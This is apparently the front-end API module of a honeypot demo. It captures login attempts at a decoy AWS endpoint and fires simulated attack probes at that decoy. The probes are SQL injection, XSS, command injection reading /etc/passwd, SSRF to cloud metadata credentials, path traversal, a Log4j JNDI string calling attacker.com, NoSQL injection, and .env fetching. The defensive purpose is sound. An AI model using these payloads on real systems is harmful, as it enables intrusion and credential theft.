const RAW_API_BASE_URL =
  import.meta.env.VITE_API_BASE_URL ||
  'https://6jcln499oi.execute-api.ap-south-1.amazonaws.com/default/ghostHouseDecoy'

// Ensure API_BASE_URL always points to the decoy root without trailing '/logs' or slashes
const API_BASE_URL = RAW_API_BASE_URL.replace(/\/logs\/?$/, '').replace(/\/+$/, '')

// LOGS_URL points specifically to the /logs endpoint
const LOGS_URL = import.meta.env.VITE_LOGS_URL || `${API_BASE_URL}/logs`

export async function submitLogin(username, password) {
  // Always log the credentials to API_BASE_URL + '/login' (decoy login probe capture)
  try {
    if (API_BASE_URL) {
      await fetch(`${API_BASE_URL}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password,
        }),
      })
    }
  } catch (error) {
    // Attacker probe was dispatched to AWS API Gateway
    console.warn('Honeypot login captured:', error)
  }

  // Artificial realistic network delay for convincing deception
  await new Promise((resolve) => setTimeout(resolve, 600))

  return {
    success: true,
    user: username,
    message: 'Access granted.',
  }
}

export async function getSecurityEvents() {
  if (!LOGS_URL) {
    return []
  }

  try {
    const response = await fetch(LOGS_URL)

    if (!response.ok) {
      throw new Error(`Request failed with status ${response.status}`)
    }

    const data = await response.json()

    if (Array.isArray(data)) {
      return data
    }

    return data.logs || data.events || data.items || []
  } catch (error) {
    // Distinguish between network/CORS error vs other errors
    const isCorsOrNetwork =
      error.name === 'TypeError' ||
      error.message?.includes('Failed to fetch') ||
      error.message?.includes('NetworkError')

    if (isCorsOrNetwork) {
      const corsErr = new Error('CORS_RESTRICTION')
      corsErr.isCors = true
      throw corsErr
    }

    throw error
  }
}

export async function dispatchAttackProbe(attackType) {
  const configs = {
    sqli: {
      url: `${API_BASE_URL}/login`,
      method: 'POST',
      body: JSON.stringify({
        username: "' UNION SELECT NULL, username, password FROM users --",
        password: "test_password",
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'sqlmap/1.7.2#stable',
      },
    },
    xss: {
      url: `${API_BASE_URL}/login`,
      method: 'POST',
      body: JSON.stringify({
        username: "<script>alert('GHOST_HOUSE_XSS')</script>",
        password: "xss_password",
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (XSS-Test-Agent)',
      },
    },
    rce: {
      url: `${API_BASE_URL}/admin`,
      method: 'POST',
      body: JSON.stringify({
        cmd: '; whoami && cat /etc/passwd',
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'GhostHouse-RCE-Sim/1.0',
      },
    },
    ssrf: {
      url: `${API_BASE_URL}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
      method: 'GET',
      headers: {
        'User-Agent': 'GhostHouse-SSRF-Sim/1.0',
      },
    },
    traversal: {
      url: `${API_BASE_URL}/..%2f..%2f..%2fetc/passwd`,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Traversal-Bot)',
      },
    },
    log4j: {
      url: `${API_BASE_URL}/login`,
      method: 'POST',
      body: JSON.stringify({
        username: '${jndi:ldap://attacker.com/exploit}',
        password: 'test',
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': '${jndi:ldap://attacker.com/exploit}',
      },
    },
    nosql: {
      url: `${API_BASE_URL}/login`,
      method: 'POST',
      body: JSON.stringify({
        username: { $gt: '' },
        password: { $gt: '' },
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'GhostHouse-NoSQL-Sim/1.0',
      },
    },
    secrets: {
      url: `${API_BASE_URL}/.env`,
      method: 'GET',
      headers: {
        'User-Agent': 'SecretHunter/1.0',
      },
    },
    scanner: {
      url: `${API_BASE_URL}/robots.txt`,
      method: 'GET',
      headers: {
        'User-Agent': 'Nikto/2.1.6',
      },
    },
    brute: {
      url: `${API_BASE_URL}/login`,
      method: 'POST',
      body: JSON.stringify({
        username: 'admin',
        password: 'password123',
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Hydra/9.5',
      },
    },
    benign: {
      url: `${API_BASE_URL}/login`,
      method: 'POST',
      body: JSON.stringify({
        username: 'corporate_analyst',
        password: 'SecureAuth#2026',
      }),
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
    },
  }

  const selected = configs[attackType] || configs.sqli

  try {
    const res = await fetch(selected.url, {
      method: selected.method,
      headers: selected.headers,
      body: selected.body || undefined,
    })
    return {
      success: true,
      status: res.status,
      type: attackType,
      target: selected.url,
    }
  } catch (error) {
    // Network / CORS request was still sent to AWS API Gateway
    return {
      success: true,
      status: 'Dispatched',
      type: attackType,
      target: selected.url,
      clientNote: error.message,
    }
  }
}
